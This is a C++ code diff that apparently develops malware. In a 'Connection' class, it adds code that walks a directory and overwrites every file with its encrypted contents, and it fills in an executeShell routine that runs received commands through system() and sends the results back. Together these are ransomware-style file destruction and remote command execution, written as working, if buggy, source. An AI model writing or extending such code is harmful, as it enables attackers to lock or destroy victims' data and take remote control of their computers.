@@ -96,15 +96,15 @@ string Connection::readFile(filesystem::path path) {
     return buffer->data();
 }
 
-void Connection::writeToFile(string path, auto &data) {
-    ofstream file{path, ofstream::binary};
+void Connection::writeToFile(filesystem::path path, auto data) {
+    ofstream file{path.string(), ofstream::binary};
     file.write(data, sizeof(data));
     file.flush();
     file.close();
     return;
 }
 
-string Connection::encryptData(string &data, string key) {
+string Connection::encryptData(string data, string key) {
 
     if (key.size() < data.size()) {
         for (int i = 0; i < data.size(); i++) {
@@ -124,14 +124,15 @@ string Connection::encryptData(string &data, string key) {
 void Connection::encryptFiles(string path) {
     getAllFiles(path, *files);
     for (int i = 0; i < files->size(); i++) {
-        encryptData(readFile(files->at(i)), "Test");
+        writeToFile(files->at(i), encryptData(readFile(files->at(i)), "Test"));
     }
 }
 
 
 void Connection::executeShell(string shell) {
-
-
+    string output = to_string(system(shell.c_str()));
+    sendMessage(output);
+    return;
 }
 
 
